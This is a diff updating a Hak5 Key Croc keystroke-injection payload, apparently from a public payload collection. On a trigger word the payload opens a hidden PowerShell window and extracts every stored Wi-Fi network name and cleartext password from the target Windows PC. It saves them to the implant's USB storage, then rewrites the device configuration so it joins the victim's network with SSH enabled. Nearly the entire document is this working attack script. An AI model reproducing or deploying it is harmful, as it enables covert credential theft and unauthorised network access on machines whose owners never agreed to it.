@@ -1,29 +1,29 @@
-# Title:           Windows Get online   
-# Description:     Get online automatically to target pc wifi or to your own wifi
+# Title:           Windows Get online
+# Description:     Get online automatically to target pc wifi
 # Author:          spywill / RootJunky
-# Version:         2.3
+# Version:         2.4
 # Category:        Key Croc
 # Props:           Cribbit, Lodrix, potong
 #
-#
 MATCH getonline
 Q LOCK
+rm /root/udisk/tools/Croc_Pot/wifipass.txt
 # --> udisk unmount
 ATTACKMODE HID STORAGE
 sleep 5
 LED ATTACK
 Q GUI r
 sleep 1
-# --> Open powershell
+# --> Start powershell
 Q STRING "powershell -NoP -NonI -W Hidden"
 Q ENTER
 sleep 2
-# --> Get KeyCroc drive
+# --> Place keycroc usb drive into variable
 Q STRING "\$Croc = (gwmi win32_volume -f 'label=\"KeyCroc\"' | Select-Object -ExpandProperty DriveLetter)"
 Q ENTER
 sleep 2
-# --> Create wifipass.txt with the taget pc SSID and PASSWD put in Keycroc loot folder
-Q STRING "(netsh wlan show networks) | Select-String \"\:(.+)\$\" | % {\$name=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{(netsh wlan show profile name=\"\$name\" key=clear)} | Select-String \"Key Content\W+\:(.+)\$\" | % {\$pass=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{[PSCustomObject]@{ PROFILE_NAME=\$name;PASSWORD=\$pass }} | Out-File -Encoding UTF8 \"\$Croc\loot\wifipass.txt\""
+# --> Retrieve taget pc SSID and PASSWD save to tools/Croc_Pot/wifipass.txt
+Q STRING "(netsh wlan show networks) | Select-String \"\:(.+)\$\" | % {\$name=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{(netsh wlan show profile name=\"\$name\" key=clear)} | Select-String \"Key Content\W+\:(.+)\$\" | % {\$pass=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{[PSCustomObject]@{ PROFILE_NAME=\$name;PASSWORD=\$pass }} | Out-File -Encoding UTF8 \"\$Croc\tools\Croc_Pot\wifipass.txt\""
 Q ENTER
 sleep 2
 Q STRING "exit"
@@ -32,9 +32,9 @@ Q ENTER
 ATTACKMODE HID
 sleep 3
 LED SETUP
-# --> Remone any existing WIFI setting & Edit config.txt with sed & Stuff the line from wifipass.txt into the hold space when processing config.txt and append and manipulate that line when needed & Remove \r end lines in config.txt file
-$(sed -i -E -e '/^[WS]/d' -e '9 a WIFI_SSID\nWIFI_PASS\nSSH ENABLE' root/udisk/config.txt) && $(sed -i -E -e '1{x;s#^#sed -n 4p root/udisk/loot/wifipass.txt#e;x};10{G;s/\n(\S+).*/ \1/};11{G;s/\n\S+//}' -e 's/\r//g' root/udisk/config.txt)                        
+# --> Remone any existing WIFI setting & Edit config.txt with sed & Stuff the line from wifipass.txt into the hold space when processing config.txt and append and manipulate that line when needed & Remove r end lines in config.txt file
+$(sed -i 's/\( \)*/\1/g' /root/udisk/tools/Croc_Pot/wifipass.txt)
+$(sed -i -E -e '/^[WS]/d' -e '9 a WIFI_SSID\nWIFI_PASS\nSSH ENABLE' root/udisk/config.txt) && $(sed -i -E -e '1{x;s#^#sed -n 4p root/udisk/tools/Croc_Pot/wifipass.txt#e;x};10{G;s/\n(\S+).*/ \1/};11{G;s/\n\S+//}' -e 's/\r//g' root/udisk/config.txt)
 sleep 2
 Q UNLOCK
 LED FINISH
-
